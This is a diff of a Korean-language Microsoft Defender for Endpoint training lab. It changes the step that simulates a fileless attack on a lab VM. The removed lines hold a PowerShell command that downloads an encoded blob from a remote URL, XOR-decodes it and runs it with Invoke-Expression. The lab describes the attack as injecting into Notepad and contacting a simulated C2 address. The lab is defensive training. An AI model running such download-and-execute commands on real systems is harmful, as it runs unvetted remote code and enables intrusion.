@@ -78,23 +78,13 @@ lab:
 
 >**경고:** 이 시뮬레이션된 공격은 연습을 통한 훌륭한 학습 소스입니다. Azure 테넌트에서 제공하는 과정을 사용할 때 이 랩에 제공된 지침의 지침에서만 공격을 수행합니다.  이 테넌트에서 이 교육 과정을 완료한 *후에* 다른 시뮬레이션된 공격을 수행할 수 있습니다.
 
-이 작업에서는 WIN1 가상 머신에 대한 공격을 시뮬레이션하고 엔드포인트용 Microsoft Defender 공격이 감지되고 완화되는지 확인합니다.
+이 작업에서는 (PowerShell 스크립트를 실행하여) WIN1 가상 머신에 대한 공격을 시뮬레이션하고 엔드포인트용 Microsoft Defender에서 공격이 탐지되고 완화되는지 확인합니다.
 
-1. WIN1 가상 머신에서 **시작** 단추를 *마우스 오른쪽 단추로 클릭*하고 **Windows PowerShell(관리자)** 을 선택합니다.
+1. **WIN1** 가상 머신에서 검색 창에 *PowerShell*을 입력하고 **Windows PowerShell**을 마우스 오른쪽 단추를 클릭한 다음 *관리자 권한으로 실행*을 선택합니다.
 
 1. “사용자 계정 컨트롤” 창이 표시되면 **예**를 선택하여 앱을 실행할 수 있도록 합니다.
 
-1. 다음 시뮬레이션 스크립트를 복사하여 PowerShell 창에 붙여넣고 **Enter** 키를 눌러 실행합니다.
-
-    ```PowerShell
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
-    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-    ```
-
-    >**참고:** 스크립트를 실행하는 동안 오류(빨간색)가 발생하면 메모장 앱을 열고 스크립트를 빈 파일에 복사할 수 있습니다. 메모장에서 *자동 줄 바꿈*이 켜져 있는지 확인합니다. 그런 다음 PowerShell에서 스크립트의 각 줄을 개별적으로 복사하고 실행합니다. 또한 랩 시작 시 다운로드한 파일에 PowerShell 스크립트(attacksim.ps1)가 제공되었습니다. 스크립트를 사용하려면 **Windows PowerShell(관리자)** 에서 *\Users\Admin\Desktop\Allfiles* 폴더로 이동하여 *.\attacksim.ps1*을 입력하고 **Enter** 키를 눌러 실행합니다.
+1. 스크립트를 사용하려면 **Windows PowerShell(관리자)** 에서 *\Users\Admin\Desktop\Allfiles* 폴더로 이동하여 *.\AttackScript.ps1*을 입력하고 **Enter** 키를 눌러 실행합니다. 다음으로 **R**을 입력하고 **Enter** 키를 눌러 *한 번 실행*으로 이동합니다.
 
 1. 스크립트는 여러 줄의 출력과 *도메인에서 도메인 컨트롤러를 확인하지 못함*이라는 메시지를 생성합니다. 몇 초 후에 *메모장* 앱이 열립니다. 시뮬레이션된 공격 코드가 메모장에 삽입됩니다. 자동으로 생성된 메모장 인스턴스를 열어 두어 전체 시나리오를 경험해 보세요. 시뮬레이션된 공격 코드는 외부 IP 주소(C2 서버 시뮬레이션)와 통신을 시도합니다.
 
